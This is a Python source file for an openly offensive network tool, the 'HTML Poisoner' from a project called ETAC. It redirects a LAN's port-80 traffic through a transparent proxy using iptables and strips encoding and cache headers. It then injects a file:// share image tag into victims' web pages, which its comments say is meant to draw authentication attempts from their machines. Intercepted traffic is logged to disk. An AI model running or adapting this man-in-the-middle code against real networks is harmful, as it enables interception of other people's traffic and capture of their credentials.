#!/usr/bin/env python
# This file is part of ETAC
# ETAC work by Felix Ryan
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

HOST = "0.0.0.0"
PORT = 3128
VERBOSE = True
TESTING = True
VERBOSETESTING = False
MAX_CONN = 50
BUFFER_SIZE = 4096
SOCKET_TIMEOUT = 2

TESTING_FILE_RxRequest = 'HTMLpoisoner.clientreq.raw'
TESTING_FILE_RxResponse = 'HTMLpoisoner.clientres.raw'
TESTING_FILE_TxRequest = 'HTMLpoisoner.serverreq.raw'
TESTING_FILE_TxResponse = 'HTMLpoisoner.serverres.raw'

from thread import *
from utils import *


def acceptConnection(connection, RxConnectionNum):
    data = connection.recv(BUFFER_SIZE)
    if VERBOSETESTING:
        printMsg(RxConnectionNum, 'Client sent ' + str(len(data)) + ' bytes')
    return str(data)


def checkForCTE(TxResponse, RxConnectionNum):
    if 'Transport-Encoding: chunked' in TxResponse:
        return True
    elif 'Content-Length:' in TxResponse:
        return False
    else:
        printMsg(RxConnectionNum, 'Chunking detection error detected')
        return None


def cleanup():
    # delete files if already exist
    for file in os.listdir('logs'):
        if re.search(TESTING_FILE_RxRequest+'[0-9]*', file):
            try:
                os.remove('logs/' + file)
            except OSError as errMsg:
                print 'Can\'t delete file: ' + str(errMsg)
        if re.search(TESTING_FILE_RxResponse+'[0-9]*', file):
            try:
                os.remove('logs/' + file)
            except OSError as errMsg:
                print 'Can\'t delete file: ' + str(errMsg)
        if re.search(TESTING_FILE_TxRequest+'[0-9]*', file):
            try:
                os.remove('logs/' + file)
            except OSError as errMsg:
                print 'Can\'t delete file: ' + str(errMsg)
        if re.search(TESTING_FILE_TxResponse+'[0-9]*', file):
            try:
                os.remove('logs/' + file)
            except OSError as errMsg:
                print 'Can\'t delete file: ' + str(errMsg)


def connectionHandler(RxConnection, RxRequest, RxAddress, RxConnectionNum):
    RxHeaders = getRxReqHeaders(RxRequest, RxConnectionNum)
    # if HTTPHeaders is not a dictionary, it probably isn't an HTTP request so send the banner
    if RxHeaders == False:
        sendBanner(RxConnection, RxConnectionNum)
    else:
        TxConnectionString = getConnectionString(RxHeaders, RxConnectionNum, RxAddress[0])
        if TxConnectionString != False:
            TxRequest = weakenRxRequest(RxRequest, RxConnectionNum, RxHeaders)
            if VERBOSETESTING:
                writeRawData(TxRequest, TESTING_FILE_TxRequest, RxConnectionNum)

            # Connect to real web server
            TxConnection = createTxConnection(TxConnectionString, RxConnectionNum)
            # Send data to real web server if connection to server was possible
            if TxConnection != False:
                TxConnection.send(TxRequest)
                # hand over processing to the correct function
                processTxResponse(TxConnection, RxConnection, RxConnectionNum)
            elif TESTING:
                printMsg(RxConnectionNum, 'No TxSocket to work with')
        else:
            # if we haven't been able to establish a valid connection string, don't do anything else
            if TESTING:
                printMsg(RxConnectionNum, 'Incomplete connection string: ' + str(TxConnectionString))
            RxConnection.close()
            if VERBOSE:
                printMsg(RxConnectionNum, 'RXConnection Closed')


def createRxSocket(host, port):
    try:
        ServerSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ServerSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # attempt to avoid socket lock problems
        if VERBOSE:
            print 'Socket build complete (' + host + ':' + str(port) + ')'
    except socket.error as errMsg:
        print color('[!] Failed to build socket') + '(' + host + ':' + str(port) + ')\n' + str(errMsg)
        sys.exit(2)
    try:
        ServerSocket.bind((host, port))
        ServerSocket.listen(MAX_CONN)
        if VERBOSE:
            print 'Socket bind complete (' + host + ':' + str(port) + ')'
    except socket.error as errMsg:
        print color('[!] Failed to bind socket') + '(' + host + ':' + str(port) + ')\n' + str(errMsg)
        sys.exit(2)
    return ServerSocket


def createTxConnection(connectionString, RxConnectionNum):
    try:
        ServerSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ServerSocket.settimeout(SOCKET_TIMEOUT)
        if VERBOSETESTING:
            printMsg(RxConnectionNum, 'TxSocket build complete (' + connectionString['host'] + ":" + str(connectionString['port']) + ')')
        ServerSocket.connect((connectionString['host'], int(connectionString['port'])))
        if VERBOSETESTING:
            printMsg(RxConnectionNum, 'TxSocket connection complete (' + connectionString['host'] + ":" + str(connectionString['port']) + ')')
        return ServerSocket
    except socket.error as errMsg:
        # xxx colour below
        print color('RxC=' + str(RxConnectionNum) + ':::[!] Failed to connect to server') + '(' + connectionString['transport'] + "://" + connectionString[
            'host'] + ":" + str(connectionString['port']) + "/" + connectionString['URI'] + ")\n" + str(
            errMsg)
        return False


def getConnectionString(RxHeaders, RxConnectionNum, RxAddress):
    # Example HeaderOne value:
    # GET http://www.google.com:8080/path/to/resource/index.php?q=example HTTP/1.1
    # the below splits the above into its component parts and creates a dictionary
    # from example should result in: "GET"
    if RxHeaders['Req'] != '':
        try:
            # from example should result in: "GET"
            method = RxHeaders['Req'].split(' ')[0]
            # from example should result in: "HTTP/1.1"
            dialect = RxHeaders['Req'].split(' ')[2]
            if VERBOSETESTING:
                printMsg(RxConnectionNum, 'Method: ' + method)
            # use of a transparent proxy won't necessarily include the host in the request header, test for this here:
            if '://' in RxHeaders['Req'].split(' ')[1]:
                # from example should result in: "http"
                transport = RxHeaders['Req'].split(' ')[1].split('://')[0]
                if VERBOSETESTING:
                    printMsg(RxConnectionNum, 'Transport: ' + transport)
                # from example should result in: "www.google.com:8080"
                hostAndPort = RxHeaders['Req'].split(' ')[1].split('://')[1].split('/')[0]
                if VERBOSETESTING:
                    printMsg(RxConnectionNum, 'Host and Port: ' + hostAndPort)
                try:
                    # from example should result in: "8080" (do this first to trigger the except earlier)
                    port = hostAndPort.split(':')[1]
                    if VERBOSETESTING:
                        printMsg(RxConnectionNum, 'Port: ' + str(port))
                    # from example should result in: "www.google.com"
                    host = hostAndPort.split(':')[0]
                    if VERBOSETESTING:
                        printMsg(RxConnectionNum, 'Host: ' + host)
                except IndexError:
                    # from example should result in: "www.google.com"
                    host = RxHeaders['Req'].split(' ')[1].split('://')[1].split('/', 1)[0]
                    if VERBOSETESTING:
                        printMsg(RxConnectionNum, 'Host: ' + host)
                    port = 80
                    if VERBOSETESTING:
                        printMsg(RxConnectionNum, 'Port: ' + str(port))
                URI = '/' + RxHeaders['Req'].split(' ')[1].split('://')[1].split('/', 1)[1]
                if VERBOSETESTING:
                    printMsg(RxConnectionNum, 'URI: ' + URI)
            else:
                # if this is triggered it means transparent proxy so have to make assumptions for below values
                transport = 'http'
                host = RxHeaders['Host']
                port = 80
                URI = RxHeaders['Req'].split(' ')[1]
                if VERBOSETESTING:
                    printMsg(RxConnectionNum, 'Transport: ' + transport)
                    printMsg(RxConnectionNum, 'Host: ' + host)
                    printMsg(RxConnectionNum, 'Port: ' + str(port))
                    printMsg(RxConnectionNum, 'URI: ' + URI)

        except IndexError as ErrMsg:
            print 'RxC=' + str(RxConnectionNum) + ':::RxHeaders issue detected: ' + str(ErrMsg) + "\n" + RxHeaders[
                'Req']
            sys.exit(2)
        connString = {'method': method, 'transport': transport, 'host': host, 'port': port, 'URI': URI, 'dialect': dialect}
        return connString
    else:
        print 'RxC=' + str(RxConnectionNum) + ':::Blank RxHeader["Req"] detected: ' + str(RxHeaders)
    return False


def getRxReqHeaders(RxRequest, RxConnectionNum):
    # Split out the data section from the headers / preamble
    HTTPData = RxRequest.split("\r\n\r\n", 1)
    # Split each line
    HTTPHeadersList = HTTPData[0].split("\r\n")
    try:
        # First line is the HTTP method and request
        HTTPHeadersDict = {'Req': HTTPHeadersList[0]}
        # The rest are colon separated headers and can be turned into a dictionary
        headerIndex = 0
        for header in HTTPHeadersList:
            if headerIndex > 0:
                headerParts = header.split(":", 1)
                HTTPHeadersDict[headerParts[0]] = str(headerParts[1]).replace(' ', '')
            headerIndex += 1
        if VERBOSETESTING:
            print 'RxC=' + str(RxConnectionNum) + ':::Headers: '+str(HTTPHeadersDict)
        return HTTPHeadersDict
    except IndexError:
        return False


# get the thing up and running
def main():
    # make sure no previous TESTING raw file captures are present
    cleanup()
    # create the lsitening socket for the transparent proxy
    RxSocket = createRxSocket(HOST, PORT)
    # once the receiving socket is setup, change the IPTABLES rules to redirect port 80 to the transparent proxy
    os.system('iptables -A PREROUTING -t nat -i br-lan -p tcp --dport 80 -j REDIRECT --to-port 3128')
    # to aid bug hunting, track each connection, initialise the first value
    RxConnectionNum = 0

    # always try and keep a socket listening
    while True:
        # allow connections to be made to the Rx socket
        RxConnection, RxAddress = RxSocket.accept()
        # receive data from the RxSocket
        RxRequest = acceptConnection(RxConnection, RxConnectionNum)
        # for testing purposes, dump data to disk
        if TESTING:
            writeRawData(RxRequest, TESTING_FILE_RxRequest, RxConnectionNum)
        # print connection details to screen to show activity
        if VERBOSETESTING:
            printMsg(RxConnectionNum, 'Connection from: ' + RxAddress[0] + ":" + str(RxAddress[1]))
        # when new connections are received, spawn a new thread to handle it
        start_new_thread(connectionHandler, (RxConnection, RxRequest, RxAddress, RxConnectionNum))
        # increment connection counter (for bug hunting)
        RxConnectionNum += 1


def manipulateContentLength(RxResponse):
    # Recalculate the size of the request as close as possible
    RxResponseNewLength = len(str(RxResponse)) + len(str(len(str(RxResponse))))
    # Insert new length into existing "Content-Length" header RxResponse
    if 'Content-Length:' in RxResponse:
        RxResponse = re.sub(r'\r\nContent-Length:.*\r\n', '\r\nContent-Length: ' + str(RxResponseNewLength) + '\r\n',RxResponse)
    else: # Insert new "Content-Length" header as previously didn't exist
        RxResponseNewLength = RxResponseNewLength + 16
        RxResponse = re.sub(r'\r\n\r\n', '\r\nContent-Length: ' + str(RxResponseNewLength) + '\r\n\r\n',RxResponse, 1)
    return RxResponse


def poisonRxResponse(TxResponse, RxConnectionNum):
    IntermediateResponse = TxResponse
    # inject new tag if lowercase "<body>" tag is found
    if '</body>' in IntermediateResponse:
        IntermediateResponse = IntermediateResponse.replace('</body>','<img src="file://htmlinject/share/random.jpg" alt="" /></body>')
    # inject new tag if uppercase "<body>" tag is found
    if '</BODY>' in IntermediateResponse:
        IntermediateResponse = IntermediateResponse.replace('</BODY>','<IMG SRC="file://htmlinject/share/random.jpg" ALT="" /></BODY>')

    RxResponse = IntermediateResponse

    if 'file://htmlinject/share/random.jpg' in RxResponse and 'Content-Type: text/html' in RxResponse:
        if VERBOSE:
            # xxx print colour
            print color('RxC=' + str(RxConnectionNum) + ':::[*] HTML poisoning performed',4)
    elif TESTING and 'Content-Type: text/html' in RxResponse:
        print color('RxC=' + str(RxConnectionNum) + ':::[!] No HTML poisoning achieved')
    return RxResponse


def printMsg(RxConnectionNum, msg):
    print 'RxC=' + str(RxConnectionNum) + ':::' + str(msg)


def processTxResponse(TxConnection, RxConnection, RxConnectionNum):
    checkedForCTE = False # CTE = Chunked Transport Encoding
    TxResponse = '' # in here to prevent older versions of Python from complaining about uninitialised variables
    RxResponse = '' # in here to prevent older versions of Python from complaining about uninitialised variables
    while True:
        # get TxResponse
        try:
            TxResponseChunk = TxConnection.recv(BUFFER_SIZE)
            if VERBOSETESTING:
                printMsg(RxConnectionNum, 'TxResponse data received')
            # if the response exists process it, otherwise don't
            if len(TxResponseChunk) == 0:
                # break loop if EOF
                TxConnection.close()
                if VERBOSE:
                    printMsg(RxConnectionNum, 'TxConnection Closed - EOF')
                break
            else: # else process TxResponse
                if VERBOSETESTING:
                    printMsg(RxConnectionNum, 'TxResponse is:' + str(len(TxResponse)) + ' bytes')
                if not checkedForCTE:
                    # only check the first TCP chunk (i.e. headers) for CTE as will only be present in headers
                    CTE = checkForCTE(TxResponseChunk, RxConnectionNum)
                    checkedForCTE = True
                if CTE == True:
                    pass
                    #processChunkedTxResponse(TxResponseChunk, TxConnection, RxConnection, RxConnectionNum)
                else:
                    # non CTE, we don't have full response yet, so just append and move onto next loop iteration
                    TxResponse += TxResponseChunk
                if TESTING:
                    writeRawData(TxResponseChunk, TESTING_FILE_TxResponse, RxConnectionNum, True)
                # don't break here - there might be more data on its way
        # socket error handling below here
        except socket.timeout as errMsg:
            if str(errMsg) == 'timed out':
                if VERBOSE:
                    printMsg(RxConnectionNum, 'TxConnection timed out')
                break
            else:
                printMsg(RxConnectionNum, 'TxConnection closed before expected: ' + str(errMsg))
        except socket.error as errMsg:
            printMsg(RxConnectionNum, 'TxConnection socket error detected: ' + str(errMsg))
    # we have to wait till we have the whole response to be able to manipulate non-chunked responses,
    if not CTE:
        try:
            writeRawData(RxResponse, TESTING_FILE_RxResponse, RxConnectionNum, True)
            # weaken the RxResponse headers
            IntermediateResponse = weakenRxResponse(TxResponse, RxConnectionNum)
            # poison the RxResponse body
            IntermediateResponse = poisonRxResponse(IntermediateResponse, RxConnectionNum)
            # update the Content-Length header to reflect any changes
            RxResponse = manipulateContentLength(IntermediateResponse)
            # finally send the whole thing to the victim
            RxConnection.send(RxResponse)
            if VERBOSETESTING:
                printMsg(RxConnectionNum, 'RxResponse sent')
        except socket.error as errMsg:
            printMsg(RxConnectionNum, 'RxResponse socket error: ' + str(errMsg))
    RxConnection.close()
    if VERBOSE:
        printMsg(RxConnectionNum, 'RXConnection Closed')


def sendBanner(connection, RxConnectionNum):
    connection.send('The HTML Poisoner at your service ma\'am...')
    if TESTING:
        # xxx print colour
        print color('RxC=' + str(RxConnectionNum) + ':::[!]Irrelevant connection detected: service banner sent') + ' (RxConn=' + str(RxConnectionNum) + ')'


def weakenRxRequest(RxRequest, RxConnectionNum, RxHeaders):
    # just here for clarity of data flow
    IntermediateRequest = RxRequest

    # Make sure the web server knows that encoding would cause us trouble by telling it that we don't want any
    IntermediateRequest = re.sub(r'\r\nAccept-Encoding:.*\r\n', '\r\nAccept-Encoding: none\r\n', IntermediateRequest, 1)
    # we want a fresh response every time, so don't bother checking if the file has been modified
    IntermediateRequest = re.sub(r'\r\nIf-Modified-Since:.*\r\n', '\r\n', IntermediateRequest, 1)
    # we still want a fresh response every time, so don't check if you have the response to previous request
    IntermediateRequest = re.sub(r'\r\nIf-None-Match:.*\r\n', '\r\n', IntermediateRequest, 1)

    # just here for clarity of data flow
    TxRequest = IntermediateRequest

    if VERBOSE and 'Accept-Encoding: none' in TxRequest and 'If-Modified-Since:' not in TxRequest and 'If-None-Match:' not in TxRequest:
        # xxx print colour
        print color('RxC=' + str(RxConnectionNum) + ':::[*] Client request weakened',3)
    elif VERBOSE:
        print color('RxC=' + str(RxConnectionNum) + ':::[!] Client request NOT fully weakened')
    if VERBOSETESTING:
        print 'RxC=' + str(RxConnectionNum) + ':::TxReq: '+TxRequest
    if TESTING:
        writeRawData(TxRequest, TESTING_FILE_TxRequest, RxConnectionNum)
    return TxRequest


# Inject HTML tag into response to ellicit resource request (and therefore auth attempt) from client
def weakenRxResponse(TxResponse, RxConnectionNum):
    # set up intermediate variable so multiple weakenings can be completed
    IntermediateResponse = TxResponse
    # Extract the headers from the TxResponse, first split out the data section from the headers / preamble
    TxData = TxResponse.split("\r\n\r\n", 1)
    # Split each line
    TxHeaders = TxData[0].split("\r\n")

    # Ranges cause problems when the MitM changes the content length - so disable them
    if 'Accept-Ranges:' in str(TxHeaders):
        IntermediateResponse = re.sub(r'\r\nAccept-Ranges:.*\r\n', '\r\nAccept-Ranges: none\r\n', IntermediateResponse, 1)

    if 'Cache-Control:' in str(TxHeaders):
        IntermediateResponse = re.sub(r'\r\nCache-Control:.*\r\n', '\r\nCache-Control: no-cache\r\n', IntermediateResponse, 1)

    RxResponse = IntermediateResponse

    if VERBOSETESTING:
        printMsg(RxConnectionNum, 'TxResponse weakening resulting in: \n' + TxResponse)
    return RxResponse


def writeRawData(data, filename, RxConnectionNum, append=False):
    if VERBOSETESTING:
        printMsg(RxConnectionNum, 'Attempting to write raw data to disk (' + filename + ') for testing purposes')
    if append:
        outputFile = open('logs/' + filename + str(RxConnectionNum), "a")
    else:
        outputFile = open('logs/'+filename+str(RxConnectionNum), "w")
    outputFile.write('\r\n\r\n(RxConn=' + str(RxConnectionNum) + ')\r\n' + data)
    outputFile.close()


if __name__ == '__main__':
    try:
        main()
    # attempt, though don't hold your breath, to shutdown gracefully when told to do so
    except KeyboardInterrupt:
        print 'User signaled exit...'
        os.system('iptables -D PREROUTING -t nat -i br-lan -p tcp --dport 80 -j REDIRECT --to-port 3128')
        try:
            sys.exit(0)
        except SystemExit:
            os._exit(0)
